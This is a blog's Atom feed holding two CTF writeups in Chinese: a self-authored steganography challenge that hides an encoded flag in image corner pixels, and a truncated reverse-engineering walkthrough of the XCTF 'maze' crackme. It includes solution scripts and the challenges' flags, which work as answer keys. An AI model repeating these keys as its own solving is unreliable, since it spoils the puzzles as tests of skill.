<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaNkLe</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2021-01-14T02:36:00.297Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次 Bugku 的 Misc 投稿过程</title>
    <link href="https://muzibing.github.io/2021/01/14/2021.01.14%EF%BC%88158%EF%BC%89/"/>
    <id>https://muzibing.github.io/2021/01/14/2021.01.14（158）/</id>
    <published>2021-01-13T16:00:00.000Z</published>
    <updated>2021-01-14T02:36:00.297Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a><font color="navy">题目来源</font></h3><p>投稿的内容灵感来源于“山东省第七届网络安全大赛”的“左上角的秘密”，经过自己修改过，将题目改为了“隐秘的角落”</p><h3 id="出题过程"><a href="#出题过程" class="headerlink" title="出题过程"></a><font color="navy">出题过程</font></h3><p>整个题目的思路很简单，只不过是将隐藏在左上角的像素点增加到了四个角落（自认为很垃圾，但是毕竟能力有限），生成包含 flag 的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"flag&#123;This_is_a_wonderful_png&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b32encode(flag)).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_jpg</span><span class="params">(flag)</span>:</span></span><br><span class="line">    im = Image.open(<span class="string">"file.jpg"</span>)</span><br><span class="line">    <span class="comment">#im = Image.new("RGB",(70, 70))</span></span><br><span class="line">    w, h = im.size</span><br><span class="line">    enc_text = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        enc_text.append([i, ord(flag[i]), randint(<span class="number">0</span>,<span class="number">255</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="comment">#im.putpixel([0,i],(enc_text[i][0],enc_text[i][1], enc_text[i][2]))</span></span><br><span class="line">        print([i,<span class="number">0</span>], (enc_text[i][<span class="number">0</span>], enc_text[i][<span class="number">1</span>], enc_text[i][<span class="number">2</span>]))</span><br><span class="line">        im.putpixel([i,<span class="number">0</span>], (enc_text[i][<span class="number">0</span>], enc_text[i][<span class="number">1</span>], enc_text[i][<span class="number">2</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    cout = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(w<span class="number">-16</span>, w):</span><br><span class="line">        print([i,<span class="number">0</span>],(enc_text[cout+<span class="number">16</span>][<span class="number">0</span>],enc_text[cout+<span class="number">16</span>][<span class="number">1</span>], enc_text[cout+<span class="number">16</span>][<span class="number">2</span>]))</span><br><span class="line">        im.putpixel([i,<span class="number">0</span>],(enc_text[cout+<span class="number">16</span>][<span class="number">0</span>],enc_text[cout+<span class="number">16</span>][<span class="number">1</span>], enc_text[cout+<span class="number">16</span>][<span class="number">2</span>]))</span><br><span class="line">        cout += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        print([i, h<span class="number">-1</span>],(enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">0</span>],enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">1</span>], enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">2</span>]))</span><br><span class="line">        im.putpixel([i, h<span class="number">-1</span>],(enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">0</span>],enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">1</span>], enc_text[i+<span class="number">16</span>*<span class="number">2</span>][<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    cout = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(w<span class="number">-16</span>, w):</span><br><span class="line">        print([i, h<span class="number">-1</span>],(enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">0</span>],enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">1</span>], enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">2</span>]))</span><br><span class="line">        im.putpixel([i, h<span class="number">-1</span>],(enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">0</span>],enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">1</span>], enc_text[cout+<span class="number">16</span>*<span class="number">3</span>][<span class="number">2</span>]))</span><br><span class="line">        cout += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#im.show()</span></span><br><span class="line">    im.save(<span class="string">"flag_enc.png"</span>,<span class="string">"PNG"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = decode_flag()</span><br><span class="line">    write_to_jpg(flag)</span><br></pre></td></tr></table></figure><p>当然脚本写的也很垃圾，生成的图片如下：</p><p><img src="/images/158-1.png" alt></p><h3 id="投稿过程"><a href="#投稿过程" class="headerlink" title="投稿过程"></a><font color="navy">投稿过程</font></h3><p><img src="/images/158-2.png" alt></p><p>第一次投稿时间是 1 月 9 日，但是因为没有 writeup 被退回了（他也没告诉我需要写 writeup），于是写过 writeup 之后，通过了审核，奖励了 150 个金币。</p><p><img src="/images/158-3.png" alt></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a><font color="navy">writeup</font></h3><h4 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h4><p>题目提示”隐秘的角落“，说明图片的角落隐藏着 flag，放大图片四角后发现有颜色，那么可能是将 flag 转化为 RGB 值写入图片中。</p><h4 id="步骤二："><a href="#步骤二：" class="headerlink" title="步骤二："></a>步骤二：</h4><p>写 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">"file.png"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exact</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> fileName</span><br><span class="line">    im = Image.open(fileName)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, w):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> i == (h<span class="number">-1</span>):</span><br><span class="line">                data = im.getpixel((j,i))</span><br><span class="line">                <span class="keyword">if</span> data != (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>):</span><br><span class="line">                    print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exact()</span><br></pre></td></tr></table></figure><p>执行脚本，打印出来四个角落中的 RGB 值得到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">(0, 84, 227)</span><br><span class="line">(1, 86, 99)</span><br><span class="line">(2, 112, 38)</span><br><span class="line">(3, 88, 85)</span><br><span class="line">(4, 82, 209)</span><br><span class="line">(5, 48, 34)</span><br><span class="line">(6, 78, 161)</span><br><span class="line">(7, 97, 239)</span><br><span class="line">(8, 77, 87)</span><br><span class="line">(9, 122, 130)</span><br><span class="line">(10, 78, 233)</span><br><span class="line">(11, 76, 28)</span><br><span class="line">(12, 85, 189)</span><br><span class="line">(13, 108, 98)</span><br><span class="line">(14, 86, 169)</span><br><span class="line">(15, 72, 227)</span><br><span class="line">(16, 85, 34)</span><br><span class="line">(17, 122, 102)</span><br><span class="line">(18, 81, 111)</span><br><span class="line">(19, 121, 211)</span><br><span class="line">(20, 78, 7)</span><br><span class="line">(21, 48, 183)</span><br><span class="line">(22, 53, 194)</span><br><span class="line">(23, 71, 192)</span><br><span class="line">(24, 87, 191)</span><br><span class="line">(25, 108, 41)</span><br><span class="line">(26, 89, 226)</span><br><span class="line">(27, 50, 131)</span><br><span class="line">(28, 87, 191)</span><br><span class="line">(29, 85, 63)</span><br><span class="line">(30, 115, 84)</span><br><span class="line">(31, 51, 248)</span><br><span class="line">(32, 84, 116)</span><br><span class="line">(33, 122, 129)</span><br><span class="line">(34, 86, 226)</span><br><span class="line">(35, 89, 36)</span><br><span class="line">(36, 86, 137)</span><br><span class="line">(37, 122, 202)</span><br><span class="line">(38, 82, 206)</span><br><span class="line">(39, 97, 137)</span><br><span class="line">(40, 82, 51)</span><br><span class="line">(41, 69, 220)</span><br><span class="line">(42, 90, 185)</span><br><span class="line">(43, 80, 247)</span><br><span class="line">(44, 83, 233)</span><br><span class="line">(45, 108, 168)</span><br><span class="line">(46, 82, 203)</span><br><span class="line">(47, 73, 116)</span><br><span class="line">(48, 83, 112)</span><br><span class="line">(49, 122, 155)</span><br><span class="line">(50, 78, 80)</span><br><span class="line">(51, 68, 151)</span><br><span class="line">(52, 78, 47)</span><br><span class="line">(53, 48, 212)</span><br><span class="line">(54, 57, 236)</span><br><span class="line">(55, 67, 107)</span><br><span class="line">(56, 87, 133)</span><br><span class="line">(57, 69, 95)</span><br><span class="line">(58, 100, 53)</span><br><span class="line">(59, 80, 8)</span><br><span class="line">(60, 78, 19)</span><br><span class="line">(61, 48, 61)</span><br><span class="line">(62, 107, 22)</span><br><span class="line">(63, 57, 62)</span><br></pre></td></tr></table></figure><p>可以看出这些 RGB 值是有规律的，说明 flag 就在其中，我们稍微改动一下脚本，将 RGB 值中的第二个值转化为对应的 ASCII 码，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">"file.png"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exact</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> fileName</span><br><span class="line">    im = Image.open(fileName)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, w):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> i == (h<span class="number">-1</span>):</span><br><span class="line">                data = im.getpixel((j,i))</span><br><span class="line">                <span class="keyword">if</span> data != (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>):</span><br><span class="line">                    print(chr(data[<span class="number">1</span>]),end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exact()</span><br></pre></td></tr></table></figure><p>得出 ASCII 值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVpXR0NaMzNLUlVHUzQyN05GWlY2WUs3TzVYVzRaREZPSlRISzNDN09CWEdPN0k9</span><br></pre></td></tr></table></figure><p>然后再打印出来 RGB 的第三个值的 ASCII 码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ãc&amp;UÑ&quot;¡ïWé½b©ã&quot;foÓ·ÂÀ¿)â¿?Tøtâ$ÊÎ3Ü¹÷é¨ËtpP/Ôìk_=&gt;</span><br></pre></td></tr></table></figure><p>第三个值的 ASCII 码有一部分是乱码，说明 flag 就隐藏在第二值中。</p><h4 id="步骤三："><a href="#步骤三：" class="headerlink" title="步骤三："></a>步骤三：</h4><p>观察第二个值得出的字符串，发现可能经过了 base 系列的编码，先尝试一下 base64 解码，得出一个字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33KRUGS427NFZV6YK7O5XW4ZDFOJTHK3C7OBXGO7I=</span><br></pre></td></tr></table></figure><p>那么再次经过 base64 解码，这次是解码失败，则尝试 base32 解码方式，最终得出 flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;This_is_a_wonderful_png&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题目来源&quot;&gt;&lt;a href=&quot;#题目来源&quot; class=&quot;headerlink&quot; title=&quot;题目来源&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;题目来源&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;投稿的内容灵感来源于“山东省第七届网络安全大赛”的“左上角的秘密”，经过
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XCTF-maze writeup</title>
    <link href="https://muzibing.github.io/2020/11/17/2020.11.17%EF%BC%88157%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/11/17/2020.11.17（157）/</id>
    <published>2020-11-16T16:00:00.000Z</published>
    <updated>2020-11-17T07:43:10.352Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-代码审计"><a class="markdownIt-Anchor" href="#1-代码审计"></a> 1. 代码审计</h3><h4 id="1-输入部分"><a class="markdownIt-Anchor" href="#1-输入部分"></a> 1) 输入部分</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Input flag:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;s1, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) != <span class="number">24</span> || (v3 = <span class="string">"nctf&#123;"</span>, <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"nctf&#123;"</span>, <span class="number">5u</span>LL)) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="number">125</span> )</span><br><span class="line">&#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong flag!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>s1 是用户要输入的字符串，为了不输出 “Wrong flag”，所以 if 语句的三个判断条件都要为 False，那么前两个分别为：</p><ul><li>字符串的长度为 24</li><li>字符串的前 5 个字符要为 <code>nctf{</code></li></ul><p>那么最后的一个条件是什么？<code>&amp;byte_6010BF + 24</code> 的地址为 <code>0x6010d7</code>，而 <code>s1</code> 的地址为 <code>0x6010C0</code>，那么 <code>&amp;byte_6010BF + 24</code> 相当于 <code>s1</code> 的第 23 个下标，也就是最后一个字符要为 “}”</p></blockquote><h4 id="2-主体部分"><a class="markdownIt-Anchor" href="#2-主体部分"></a> 2) 主体部分</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">5L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(&amp;s1 + v4);<span class="comment">// v5 是输入字符串 &#123; &#125; 之间的部分内容的起使地址</span></span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">78</span> )<span class="comment">// 应该是从这里遍历每个字符，如果字符的 ASCII 码大于 78(N)，则执行 if 部分的语句</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="number">79</span> )<span class="comment">// 如果 ASCII 等于 79（O），则执行 sub_400650() 函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400650((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);<span class="comment">// 将 &amp;v10 + 4 的地址传给 sub_400650() 函数，该函数是对 &amp;v10 + 4 地址处的值减 1</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">111</span> )<span class="comment">// 如果 ASCII 等于 111（o），则执行 sub_400660() 函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400660((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);<span class="comment">// 将 &amp;v10 + 4 的地址传给 sub_400660() 函数，该函数是对 &amp;v10 + 4 地址处的值加 1</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">// 如果字符的 ASCII 码小于等于 78(N)，则执行 else 部分的语句</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="number">46</span> )<span class="comment">// 如果 ASCII 等于 46（.），则执行 sub_400670() 函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400670(&amp;v10, v3);<span class="comment">// 该函数是对 &amp;v10 地址处的值减 1</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">48</span> )<span class="comment">// 如果 ASCII 等于 46（.），则执行 sub_400680() 函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400680(&amp;v10, v3);<span class="comment">// 该函数是对 &amp;v10 地址处的值加 1</span></span><br><span class="line">LABEL_14:</span><br><span class="line">          v6 = v7;<span class="comment">// 将上述四种情况得到的 Bool 值赋给 v6</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)HIDWORD(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_400690(asc_601060, HIDWORD(v10), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10) )<span class="comment">// 该函数很重要，下面详细讲述</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> )<span class="comment">// 遍历输入字符串的 &#123; &#125; 部分条件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )<span class="comment">// 要想执行正确的结果，就得需要最后一次的 v6 为 1，这一点很容易被满足</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        v8 = <span class="string">"Wrong flag!"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( asc_601060[<span class="number">8</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v10 + SHIDWORD(v10)] != <span class="number">35</span> )<span class="comment">//  下面详细讲一下该点</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v8 = <span class="string">"Congratulations!"</span>;</span><br></pre></td></tr></table></figure><blockquote><p>上面是该程序的主要组成部分，注释标明了相应部分的作用，下面将会对上述代码中的两个部分进行详细的描述：<code>sub_400690</code> 和 <code>asc_601060</code></p></blockquote><p><code>asc_601060</code></p><blockquote><p>该地址处的内容为：<code>******* * **** * **** * *** *# *** *** *** *********</code>，一共是 64 个字符。</p></blockquote><p><code>sub_400690</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400690</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="number">8L</span>L * a3);</span><br><span class="line">  LOBYTE(result) = (_DWORD)result == <span class="number">32</span> || (_DWORD)result == <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>a1</code> 是 <code>asc_601060</code> 的首地址， <code>a2</code> 是 <code>HIDWORD(v10)</code>，但是并不是很了解该类型，但是可以阅读汇编语言来了解，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; .text:00000000004007BB                 mov     esi, dword ptr [rsp+28h+var_28+4]</span><br><span class="line">&gt; .text:00000000004007BF                 mov     edx, dword ptr [rsp+28h+var_28]</span><br><span class="line">&gt; .text:00000000004007C2                 mov     edi, offset asc_601060 ; &quot;  *******   *  **** * ****  * ***  *#  &quot;...</span><br><span class="line">&gt; .text:00000000004007C7                 call    sub_400690</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看出 <code>esi</code> 值为 <code>rsp+28h+var_28+4</code> 也就是 <code>&amp;v10+4</code>，那么可以将上面的第 5 行简化为 <code>a1[a2 + 8 * a3]</code>，a1 相当于一个二维数组，每行的数据一共为 8 个，那么共有 8 行数据，那么将 <code>******* * **** * **** * *** *# *** *** *** *********</code> 转化为数组形式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;     * * * * * *</span><br><span class="line">&gt; *       *     *</span><br><span class="line">&gt; * * *   *   * *</span><br><span class="line">&gt; * *     *   * *</span><br><span class="line">&gt; *     * #     *</span><br><span class="line">&gt; * *   * * *   *</span><br><span class="line">&gt; * *           *</span><br><span class="line">&gt; * * * * * * * *</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>该函数要返回的值为 <code>1</code> ，所以 result 的值必须是 32 或 35 其中的一个，也就是 <code>' '</code> 和 <code>'#'</code> 字符，也就是说每次移动得到的下标对应的值不能为<code>“*”</code>。</p></blockquote><p><code>asc_601060[8 * (signed int)v10 + SHIDWORD(v10)] != 35</code></p><blockquote><p>最后的要求为遍历完字符串以后，得到的 <code>v10</code> 和 <code>(int 8)(&amp;v10+4)</code> 的最终值要满足 <code>asc_601060[8 * v10 + (int 8)(&amp;v10+4)] = '#'</code>，那么就是 <code>8 * v10 + (int 8)(&amp;v10+4) = 36</code>，也就是 <code>v10 = 4</code> 和 <code>(&amp;v10+4) = 4</code>，这一点可以和上面的部分相吻合（’#’ 在上面的图案的下标为 (4, 4) ）</p></blockquote><h3 id="2-问题抽取"><a class="markdownIt-Anchor" href="#2-问题抽取"></a> 2. 问题抽取</h3><h4 id="1-问题分析"><a class="markdownIt-Anchor" href="#1-问题分析"></a> 1) 问题分析</h4><p>从上文的分析中可以得出几个有用的结论：</p><blockquote><ol><li><p>输入的字符串长度为 24，且格式要为 